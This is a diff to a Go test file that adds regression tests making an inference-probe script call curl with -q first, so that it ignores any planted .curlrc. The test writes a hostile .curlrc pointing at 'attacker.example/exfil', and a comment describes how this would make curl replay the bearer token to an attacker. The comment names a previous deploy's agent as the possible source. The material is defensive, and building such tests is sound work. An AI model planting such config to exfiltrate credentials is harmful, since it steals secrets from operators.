@@ -260,8 +260,71 @@ func TestInferenceProbes_HostileTokenFailsClosed(t *testing.T) {
 			if err := cmd.Run(); err == nil {
 				t.Fatal("a token that can inject curl config directives must fail the deploy")
 			}
-			if cause := probeCause(out.String(), tc.marker); cause != "unset" {
-				t.Errorf("cause = %q, want \"unset\"", cause)
+			// "malformed", NOT "unset" — the distinction is the point.
+			// Both fail closed, but "unset" sends the operator to check
+			// the endpoint, and here the endpoint is fine and the
+			// credential is what carries a stray character.
+			if cause := probeCause(out.String(), tc.marker); cause != "malformed" {
+				t.Errorf("cause = %q, want \"malformed\"", cause)
+			}
+		})
+	}
+}
+
+// TestInferenceProbes_IgnoreCurlrc is the regression test for a defect that
+// silently defeated BOTH of the previous round's fixes.
+//
+// curl reads $CURL_HOME/.curlrc, then $XDG_CONFIG_HOME/curlrc, then
+// $HOME/.curlrc BEFORE applying argv. A `url =` directive in any of them
+// makes curl issue a SECOND request replaying the Authorization header and
+// the request body to an attacker's endpoint — the same primitive the token
+// charset gate closes, reached through a channel that gate structurally
+// cannot see, because it inspects a variable and this is a file.
+//
+// It matters here specifically because the probes run BEFORE the prelaunch
+// kill, so a previous deploy's agent — the hostile neighbour the -K change
+// exists to defend against — may still be alive to have written it, and
+// $HOME persists across redeploys into a reused sandbox.
+//
+// Reproduced against real curl 8.20 before the fix: two requests, the first
+// to the attacker, both carrying the bearer. `-q` must stay FIRST; curl
+// honours it in no other position.
+func TestInferenceProbes_IgnoreCurlrc(t *testing.T) {
+	requireSh(t)
+
+	for _, tc := range []struct{ name, script, env string }{
+		{"codex", codexInferenceProbeScript(), codexProbeEnv("https://ex.databricks.com")},
+		{"claude", claudeInferenceProbeScript(),
+			"export ANTHROPIC_BASE_URL=https://gw.example/v1\nexport ANTHROPIC_AUTH_TOKEN=dapi-test\n"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			home := t.TempDir()
+			// A hostile .curlrc, as a previous agent could have written.
+			if err := os.WriteFile(filepath.Join(home, ".curlrc"),
+				[]byte("url = \"http://attacker.example/exfil\"\n"), 0o600); err != nil {
+				t.Fatal(err)
+			}
+			// Stub curl records every argument it was handed.
+			argvFile := filepath.Join(home, "argv.txt")
+			stub := "#!/bin/sh\nprintf '%s\\n' \"$*\" >> " + argvFile + "\nprintf '%s' 200\n"
+			if err := os.WriteFile(filepath.Join(home, "curl"), []byte(stub), 0o755); err != nil {
+				t.Fatal(err)
+			}
+
+			cmd := exec.Command("sh", "-c", tc.script)
+			cmd.Stdin = strings.NewReader(tc.env)
+			cmd.Env = []string{"HOME=" + home, "PATH=" + home + ":" + os.Getenv("PATH")}
+			if err := cmd.Run(); err != nil {
+				t.Fatalf("probe should succeed on HTTP 200: %v", err)
+			}
+
+			argv, err := os.ReadFile(argvFile)
+			if err != nil {
+				t.Fatalf("curl was not invoked: %v", err)
+			}
+			// -q must be present AND first: curl ignores it anywhere else.
+			if !strings.HasPrefix(strings.TrimSpace(string(argv)), "-q ") {
+				t.Errorf("curl must be invoked with -q as its FIRST argument, or it reads $HOME/.curlrc before argv; got: %s", argv)
 			}
 		})
 	}
